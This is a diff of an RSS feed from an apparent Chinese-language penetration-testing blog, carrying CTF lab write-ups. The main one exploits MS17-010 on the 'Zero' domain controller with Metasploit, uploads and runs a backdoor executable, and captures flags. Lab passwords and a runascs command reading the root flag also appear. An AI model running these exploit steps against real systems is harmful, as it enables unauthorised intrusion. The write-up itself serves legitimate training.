+   28  auxiliary/admin/mssql/mssql\_escalate\_execute\_as       .                normal   No     Microsoft SQL Server Escalate EXECUTE AS
+   29  auxiliary/admin/mssql/mssql\_escalate\_execute\_as\_sqli  .                normal   No     Microsoft SQL Server SQLi Escalate Execute AS
+   30  exploit/windows/smb/smb\_doublepulsar\_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   31    \\_ target: Execute payload (x64)                    .                .        .      .
+   32    \\_ target: Neutralize implant                
+<br>试试exploit/windows/smb/ms17_010_psexec <br>use exploit/windows/smb/ms17\_010\_psexec 
+set rhost
+run
+<br>上传cs后门并运行<br>upload 4444.exe C:\\4444.exe
+excute -f C:\\4444.exe
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" referrerpolicy="no-referrer"><br>system权限 已经拿下了<br>HMV{Z3r0\_l0g0n\_!s\_Pr3tty\_D4ng3r0u$}
+HMV{D0nt\_r3us3\_p4$$w0rd5!}
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/23.zero.html</link><guid isPermaLink="false">24-渗透/HMV/23.Zero.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[24.liar]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -7378,175 +7546,7 @@ SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Desha
 <br>可以发现这个用户是属于管理员组的<br>直接读取flag<br>\*Evil-WinRM\* PS C:\users\nica&gt; .\runascs.exe akanksha sweetgirl "cmd /c type c:\users\Administrador\root.txt"
 
 HMV1STWINDOWZ
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/24.liar.html</link><guid isPermaLink="false">24-渗透/HMV/24.liar.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[23.Zero]]></title><description><![CDATA[ 
- <br><br>
-<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
-<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
-<br><a data-tooltip-position="top" aria-label="3. 获取一个AD用户" data-href="#3. 获取一个AD用户" href="https://www.c1trus.top/about:blank#3._获取一个AD用户" class="internal-link" target="_self" rel="noopener nofollow">3. 获取一个AD用户</a>
-
-<br><a data-tooltip-position="top" aria-label="3.1. SMB空会话检测" data-href="#3.1. SMB空会话检测" href="https://www.c1trus.top/about:blank#3.1._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMB空会话检测</a>
-<br><a data-tooltip-position="top" aria-label="3.2. kerbrute爆破用户" data-href="#3.2. kerbrute爆破用户" href="https://www.c1trus.top/about:blank#3.2._kerbrute爆破用户" class="internal-link" target="_self" rel="noopener nofollow">3.2. kerbrute爆破用户</a>
-
-
-<br><a data-tooltip-position="top" aria-label="4. 再打MS17-010" data-href="#4. 再打MS17-010" href="https://www.c1trus.top/about:blank#4._再打MS17-010" class="internal-link" target="_self" rel="noopener nofollow">4. 再打MS17-010</a>
-<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Zero
-<br>作者：[ruycr4ft](https://hackmyvm.eu/profile/?user=ruycr4ft)
-<br>难度：⭐️
-<br>知识点：MS17-010
-<br><br> fscan -h 192.168.56.15
-
-   \_\_\_                              \_
-  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
- / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
-/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
-\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
-                     fscan version: 1.8.4
-start infoscan
-192.168.56.15:445 open
-192.168.56.15:139 open
-192.168.56.15:135 open
-192.168.56.15:88 open
-[\*] alive ports len is: 4
-start vulscan
-[+] MS17-010 192.168.56.15      (Windows Server 2016 Standard Evaluation 14393)
-[\*] NetBios 192.168.56.15   [+] DC:DC01.zero.hmv                 Windows Server 2016 Standard Evaluation 14393
-[\*] NetInfo
-[\*]192.168.56.15
-   [-&gt;]DC01
-   [-&gt;]192.168.56.15
-已完成 4/4
-[\*] 扫描结束,耗时: 3.061390899s
-
-┌──(root㉿kali)-[/home/kali/hmv/Zero]
-└─# nmap -sC -sV 192.168.56.15 -T4
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 07:06 CST
-Nmap scan report for 192.168.56.15
-Host is up (0.00015s latency).
-Not shown: 989 filtered tcp ports (no-response)
-PORT     STATE SERVICE      VERSION
-53/tcp   open  domain       Simple DNS Plus
-88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-20 22:37:00Z)
-135/tcp  open  msrpc        Microsoft Windows RPC
-139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
-389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
-445/tcp  open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup:
-464/tcp  open  kpasswd5?
-593/tcp  open  ncacn\_http   Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped
-3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
-3269/tcp open  tcpwrapped
-MAC Address: 08:00:27:CB:14:11 (Oracle VirtualBox virtual NIC)
-Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:cb:14:11 (Oracle Virtual NIC)
-| smb-os-discovery:
-|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3
-|   Computer name: DC01
-|   NetBIOS computer name: DC01\x00
-|   Domain name: zero.hmv
-|   Forest name: zero.hmv
-|   FQDN: DC01.zero.hmv
-|\_  System time: 2024-11-20T14:37:01-08:00
-|\_clock-skew: mean: 2h09m55s, deviation: 4h37m07s, median: -30m04s
-| smb-security-mode:
-|   account\_used: guest
-|   authentication\_level: user
-|   challenge\_response: supported
-|\_  message\_signing: required
-| smb2-time:
-|   date: 2024-11-20T22:37:01
-|\_  start\_date: 2024-11-20T22:35:17
-| smb2-security-mode:
-|   3:1:1:
-|\_    Message signing enabled and required
-<br>配置/etc/hosts<br>192.168.56.15 DC01.zero.hmv  zero.hmv
-<br>发现有永恒之蓝。<br>直接上msf打一波看看<br>use exploit/windows/smb/ms17\_010\_eternalblue
-set payload windows/x64/meterpreter/bind\_tcp\_uuid
-set rhosts 172.22.11.45
-run
-<br>直接给靶机干蓝屏了。重新利用好像不行了。<br>还是正常打吧。<br><br><br>┌──(root㉿kali)-[/home/kali/hmv/Zero]
-└─# smbmap -u guest -H zero.hmv
-
-    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
-   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
-  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
-   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
-    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
-   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
-  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
- -----------------------------------------------------------------------------
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
-
-[\*] Detected 1 hosts serving SMB
-[\*] Established 0 SMB session(s)
-<br>没有<br><br>┌──(root㉿kali)-[/home/kali/hmv/Zero]
-└─# kerbrute userenum -d zero.hmv -t 100 --dc DC01.zero.hmv /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o valid\_user.txt
-
-    \_\_             \_\_               \_\_
-   / /\_\_\_\_\_  \_\_\_\_\_/ /\_  \_\_\_\_\_\_\_  \_\_/ /\_\_\_\_
-  / //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
- / ,&lt; /  \_\_/ /  / /\_/ / /  / /\_/ / /\_/  \_\_/
-/\_/|\_|\\_\_\_/\_/  /\_.\_\_\_/\_/   \\_\_,\_/\\_\_/\\_\_\_/
-
-Version: v1.0.3 (9dad6e1) - 11/21/24 - Ronnie Flathers @ropnop
-
-2024/11/21 07:23:00 &gt;  Using KDC(s):
-2024/11/21 07:23:00 &gt;   DC01.zero.hmv:88
-
-2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       administrator@zero.hmv
-2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       Administrator@zero.hmv
-2024/11/21 07:26:17 &gt;  [+] VALID USERNAME:       dc01@zero.hmv
-2024/11/21 07:27:35 &gt;  Done! Tested 8295455 usernames (3 valid) in 275.149 seconds
-<br>也没有什么东西<br><br>msf里面可不止一种MS17-010的利用<br>msf6 &gt; search ms17
-
-Matching Modules
-================
-
-   #   Name                                                  Disclosure Date  Rank     Check  Description
-   -   ----                                                  ---------------  ----     -----  -----------
-   0   exploit/windows/smb/ms17\_010\_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
-   1     \\_ target: Automatic Target                         .                .        .      .
-   2     \\_ target: Windows 7                                .                .        .      .
-   3     \\_ target: Windows Embedded Standard 7              .                .        .      .
-   4     \\_ target: Windows Server 2008 R2                   .                .        .      .
-   5     \\_ target: Windows 8                                .                .        .      .
-   6     \\_ target: Windows 8.1                              .                .        .      .
-   7     \\_ target: Windows Server 2012                      .                .        .      .
-   8     \\_ target: Windows 10 Pro                           .                .        .      .
-   9     \\_ target: Windows 10 Enterprise Evaluation         .                .        .      .
-   10  exploit/windows/smb/ms17\_010\_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
-   11    \\_ target: Automatic                                .                .        .      .
-   12    \\_ target: PowerShell                               .                .        .      .
-   13    \\_ target: Native upload                            .                .        .      .
-   14    \\_ target: MOF upload                               .                .        .      .
-   15    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
-   16    \\_ AKA: ETERNALROMANCE                              .                .        .      .
-   17    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
-   18    \\_ AKA: ETERNALBLUE                                 .                .        .      .
-   19  auxiliary/admin/smb/ms17\_010\_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
-   20    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
-   21    \\_ AKA: ETERNALROMANCE                              .                .        .      .
-   22    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
-   23    \\_ AKA: ETERNALBLUE                                 .                .        .      .
-   24  auxiliary/scanner/smb/smb\_ms17\_010                    .                normal   No     MS17-010 SMB RCE Detection
-   25    \\_ AKA: DOUBLEPULSAR                                .                .        .      .
-   26    \\_ AKA: ETERNALBLUE                                 .                .        .      .
-   27  exploit/windows/fileformat/office\_ms17\_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
-   28  auxiliary/admin/mssql/mssql\_escalate\_execute\_as       .                normal   No     Microsoft SQL Server Escalate EXECUTE AS
-   29  auxiliary/admin/mssql/mssql\_escalate\_execute\_as\_sqli  .                normal   No     Microsoft SQL Server SQLi Escalate Execute AS
-   30  exploit/windows/smb/smb\_doublepulsar\_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
-   31    \\_ target: Execute payload (x64)                    .                .        .      .
-   32    \\_ target: Neutralize implant                
-<br>试试exploit/windows/smb/ms17_010_psexec <br>use exploit/windows/smb/ms17\_010\_psexec 
-set rhost
-run
-<br>上传cs后门并运行<br>upload 4444.exe C:\\4444.exe
-excute -f C:\\4444.exe
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" referrerpolicy="no-referrer"><br>system权限 已经拿下了<br>HMV{Z3r0\_l0g0n\_!s\_Pr3tty\_D4ng3r0u$}
-HMV{D0nt\_r3us3\_p4$$w0rd5!}
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/23.zero.html</link><guid isPermaLink="false">24-渗透/HMV/23.Zero.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[22.DC03]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/24.liar.html</link><guid isPermaLink="false">24-渗透/HMV/24.liar.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[22.DC03]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -10003,7 +10003,7 @@ Dec 21 10:32:45 server auth_proxy: Probando creaci
 600
 
 <br>600]]></description><link>https://www.c1trus.top/24-渗透/thl/9.binary-trail.html</link><guid isPermaLink="false">24-渗透/THL/9.Binary Trail.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
- <br><br>
+ <br>****## 1. 基本信息^toc<br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
 <br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a>
@@ -10344,7 +10344,7 @@ Task Completed
 /login=bubba:TuprimerP@ssword1234!<br>利用这个用户可以rdp到主机 20.20.20.5<br>
 登录后需要重置密码 因为密码过期了<br>Warning
 这里是西班牙键盘 ，输入密码的@不是我们正常的键盘输入的。 这里建议用屏幕键盘输入密码
-<br>进来后桌面就有用户flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 12:57:18 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
+<br>进来后桌面就有用户flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 12:59:26 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
